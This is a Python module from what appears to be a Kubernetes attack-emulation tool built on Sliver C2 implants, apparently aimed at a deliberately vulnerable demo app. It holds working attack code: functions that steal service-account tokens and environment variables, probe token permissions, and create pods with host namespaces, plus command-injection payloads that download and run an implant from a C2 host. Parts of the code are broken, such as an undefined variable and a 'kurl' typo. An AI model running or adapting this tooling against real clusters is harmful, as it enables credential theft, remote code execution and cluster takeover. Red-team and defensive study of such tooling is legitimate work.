from functools import lru_cache
import json
from itertools import groupby
from adapters.sliver_wrapper import get_file
from domain import events, k8s
from domain.entities import AccessLevel, Entity, Pod, Service, ServiceAccount, ServiceAccountToken
from domain.implant import Implant
from domain.ttps import TTP, DeployPodParams, Tactic, Technique, ExploitParams
from pydantic import BaseModel


class Action(BaseModel):
    name: str
    ttp: TTP
    requires: list[str] = []
    consequence: list[str] = []


SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"


async def read_service_account_token(implant: Implant, *args, **kwargs) -> events.Event | None:
    raw_token = await get_file(implant.client, session_id=implant.session_id, path=SA_TOKEN_PATH)
    if raw_token is None:
        raise FileNotFoundError(f"Could not read token '{SA_TOKEN_PATH}' on {implant.session_id}")

    raw_token = raw_token.decode("utf-8")

    return events.ServiceAccountTokenExtracted(source_system_id=implant.system_id, token=raw_token)


async def read_environment_variables(implant: Implant, *args, **kwargs) -> events.Event | None:
    # TODO make this C2 agnostic
    session = await implant.client.interact_session(implant.session_id)
    res = await session.execute('env', args=None)
    stdout = res.Stdout.decode('utf-8')
    env_vars = {}
    for line in stdout.split("\n"):
        if line.strip() != "":
            k, v = line.split("=", maxsplit=1)
            env_vars[k] = v
    return events.EnvironmentVariablesExtracted(source_system_id=implant.system_id, variables=env_vars)


async def get_sa_token_permission(
    implant: Implant, serviceaccount: ServiceAccount, *args, **kwargs
) -> events.Event | None:
    # async def get_sa_token_permission(implant: Implant, sa_token: ServiceAccountToken | None = None) -> events.Event | None:
    session = await implant.client.interact_session(implant.session_id)
    # TODO currently requires cURL -are any pre-requisite checks requ has curl?
    # - can download sth?
    kind = "SelfSubjectRulesReview"
    api_version = "authorization.k8s.io/v1"
    body = {
        "kind": kind,
        "apiVersion": api_version,
        "spec": {"namespace": serviceaccount.token.namespace},
        # "metadata": {"creationTimestamp": None},
        # "status": {"resourceRules": None, "nonResourceRules": None, "incomplete": None},
    }
    args = [
        "-XPOST",
        "--cacert",
        CA_PATH,
        "-H",
        f"Authorization: Bearer {serviceaccount.token.raw}",
        "-H" "Accept: application/json, */*",
        "-H",
        "Content-Type: application/json",
        f"{serviceaccount.token.issuer}/apis/{api_version}/selfsubjectrulesreviews",
        # f"https://{api_server_ip}:{api_server_port}/apis/{api_version}/selfsubjectrulesreviews",
        "--data",
        json.dumps(body),
    ]
    res = await session.execute("curl", args=args)
    if res.Status == 0:
        result = res.Stdout.decode('utf-8')
        rules_review = json.loads(result)
        return events.TokenCapabilitiesQueried(
            # TODO should the source system really be the system with the implant? this request could be done on any other pod as well
            source_system_id=implant.system_id,
            service_account=serviceaccount,
            resource_rules=rules_review["status"]["resourceRules"],
            non_resource_rules=rules_review["status"]["nonResourceRules"],
        )
    else:
        reason = res.Stderr.decode('utf-8')
        msg = f"Could not retrieve permissions: {reason}"
        return events.UiEvent(type=events.EventType.Error, data=msg)


async def list_available_binaries(implant: Implant, *args, **kwargs) -> events.Event | None:
    session = await implant.client.interact_session(implant.session_id)
    res = await session.execute('dpkg', args=["-l"])
    stdout = res.Stdout.decode('utf-8')
    binaries = {}
    if stdout:
        for line in stdout.split("\n"):
            if line.startswith(('ii', 'hi', 'rc', 'pi', 'pu')):
                columns = line.split()
                if len(columns) >= 3:
                    state, name, version, *_ = columns
                    # if ':' in version:
                    #     _, version = version.split(':', 1)
                    # version = version.split('-', 1)[0]
                    binaries[name] = version

    return events.SystemBinariesListed(source_system_id=implant.system_id, binaries=binaries)


async def exploit_cmd_injection(
    implant: Implant, target: Pod | Service, ttp: TTP, *args, target_url: str = "", params: dict = {}, **kwargs
) -> events.Event | None:
    session = await implant.client.interact_session(implant.session_id)
    payload = "".join(f"{k}={v}" for k, v in params.items())

    res = await session.execute(
        'curl',
        args=[target_url, "-L", "--get", "--data-urlencode", payload],
    )
    return None


async def deploy_pod(implant: Implant, pod: Pod, ttp: TTP,  *args, params:dict=None, **kwargs):
    session = await implant.client.interact_session(implant.session_id)

    assert pod.service_account is not None
    sa_token = pod.service_account.token

    api_url = f"{sa_token.issuer}/api/v1/namespaces/{pod.ns}/pods"

    name = params.get("name", f"ran-{session.last_checkin}") # TODO default podname should be stealthier
    name = name.lower().replace(" ", "-")  # make it RFC 1123 compliant
    pod_spec = k8s.PodSpec(
        name=name, 
        ns=kwargs.get("namespace", pod.ns),
        containers=[
            k8s.Container(name=name, image=params.get("image", "busybox"), cmd=params["cmd"], args=params["args"])],
        host_network= params.get("useHostNetwork", None),
        host_ipc = params.get("useHostIPC", None),
        host_pid =params.get("useHostPID", None),
    )

    args = [
        "-XPOST",
        "--cacert",
        CA_PATH,
        "-H",
        f"Authorization: Bearer {sa_token.raw}",
        "-H" "Accept: application/json, */*",
        "-H",
        "Content-Type: application/json",
        api_url,
        # f"https://{api_server_ip}:{api_server_port}/apis/{api_version}/selfsubjectrulesreviews",
        "--data",
        pod_spec.model_dump_json()
    ]
    res = await session.execute("curl", args=args)
    if res.Status == 0:
        raw_result = res.Stdout.decode('utf-8')
        result = json.loads(raw_result)
        result_kind = result["kind"]

        if result_kind == "Pod":
        # if r.code == 200:
            # TODO return pod created event
            return events.ResourceCreated(resource=result)
        else:
            status = ApiStatus(**result)
            if status.code == 409: # resource exists already
                return events.UiEvent(type=events.EventType.Error, data= f"Couldn't create pod: '{r.message}'")
            else:
                return events.UiEvent(type=events.EventType.Error, data= f"Couldn't create pod: '{r.message}'")
        


    else:
        reason = res.Stderr.decode('utf-8')
        msg = f"cURL request unsuccessful: {reason}"
        return events.UiEvent(type=events.EventType.Error, data=msg)


    a = 5
class StatusDetails(BaseModel):
    name: str | None = None
    kind: str | None = None
    phase: str | None = None

class ApiStatus(BaseModel):
    kind: str
    apiVersion: str
    metadata: object ={}
    status: str
    message: str
    reason: str
    details: StatusDetails
    code: int


# a list of CVEs for Container Vulnerability exploits:
#  https://youtu.be/1HbwfpE4XKY?t=1459
# Dirtypipe https://dirtypipe.cm4all.com (linux 5.8 <5.16.11,5.15.25,5.102)


class Armory:
    def __init__(self):
        ttps: list[TTP] = [
            TTP(
                name="Exploit Envoy Proxy CMD injection",
                tactic=Tactic.InitialAccess,
                technique=Technique.ExploitPublicFacingApp,
                params=ExploitParams(
                    endpoint="http://unguard.kube/healthz",
                    params={"path": '127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &'},
                    method="GET",
                ),
            ),
            TTP(
                name="Exploit Proxy Service CMD injection",
                tactic=Tactic.LateralMovement,
                technique=Technique.ExploitationForPrivilegeEscalation,
                execute=exploit_cmd_injection,
                params=ExploitParams(
                    endpoint="$TARGET/image",
                    params={"url": '127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &'},
                    method="GET",
                ),
            ),
            # TTP(
            #     name="Exploit Public-Facing Application",
            #     tactic=Tactic.InitialAccess,
            #     technique=Technique.ExploitPublicFacingApp,
            # ),
            TTP(
                name="Read Service Account Token",
                ms_id="MS-TA9016",
                technique=Technique.ContainerServiceAccount,  # MITRE would be StealApplicationAccessToken
                tactic=Tactic.CredentialAccess,
                action="get_file",
                requires={"access_level": AccessLevel.UserRead},
                consequence=["pod_name", "serviceaccount_name", "namespace name"],
                execute=read_service_account_token,
            ),
            TTP(
                name="Check ServiceAccount permissions",
                tactic=Tactic.Discovery,
                technique=Technique.PermissionGroupsDiscovery_CloudGroups,  # TODO: not sure about this mapping
                requires={"kind": "ServiceAccount"},
                execute=get_sa_token_permission,
            ),
            # TTP(
            #     name="Container and Resource Discovery",
            #     tactic=Tactic.Discovery,
            #     technique=Technique.ContainerAndResourceDiscovery,
            # ),
            # TTP(name="Get working directory", tactic=Tactic.Discovery, technique="", action="pwd"),
            # TTP(name="List files", tactic=Tactic.Discovery, technique=Technique.FileAndDirectoryDiscovery, action="ls"),
            TTP(
                name="List environment variables",
                tactic=Tactic.Discovery,
                technique=Technique.GatherVictimHostInformation,
                action="env",
                execute=read_environment_variables,
                requires={"os": "linux", "access_level": AccessLevel.UserExecute},
            ),
            TTP(
                name="List binaries",
                tactic=Tactic.Discovery,
                technique=Technique.GatherVictimHostInformation,
                execute=list_available_binaries,
                requires={"os": "linux", "access_level": AccessLevel.UserExecute},
            ),
            TTP(
                name="System Network Configuration Discovery",
                tactic=Tactic.Discovery,
                technique=Technique.SystemNetworkConfigurationDiscovery,
                action="ifconfig",
                requires={"kind": "Pod", "access_level": AccessLevel.UserExecute},
            ),
            TTP(
                name="Deploy Container",
                tactic=Tactic.Execution,
                technique=Technique.DeployContainer,
                # requires={"can": "create pods"},
                execute=deploy_pod,
                params=DeployPodParams(
                    name='Debug Pod',
                    cmd= "/bin/bash",
                    args= ["-c", "kurl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
                    image="r0binak/mtkpi:v1",
                    ports=[
                        {"containerPort": 7681}, # TTYD port for web shell, might be skipped
                    ],
                ),
            )
            # TTP(  # video for implementation KubeCon NA'23: https://www.youtube.com/watch?v=mqnm0AXoNgc
            #     # TODO implement
            #     name="Sidecar Injection",
            #     tactic=Tactic.Execution,
            #     technique=Technique.Deploycontainer,
            #     ms_id="MS-TA9011",
            #     requires=["role:can-patch-deployment"],
            # ),
        ]
        self.ttps = {t.id: t for t in ttps}

    def get_grouped_ttps(self) -> dict[Tactic, list[TTP]]:
        groups = groupby(self.ttps.values(), key=lambda t: t.tactic)
        # resolve the entries, so they can be properly serialized via `model_dumps`
        ttps = {tactic: list(techniques) for (tactic, techniques) in groups}
        return ttps

    def get_ttp_by_id(self, ttp_id: str) -> TTP | None:
        return self.ttps.get(ttp_id, None)


@lru_cache
def get_armory():
    return Armory()
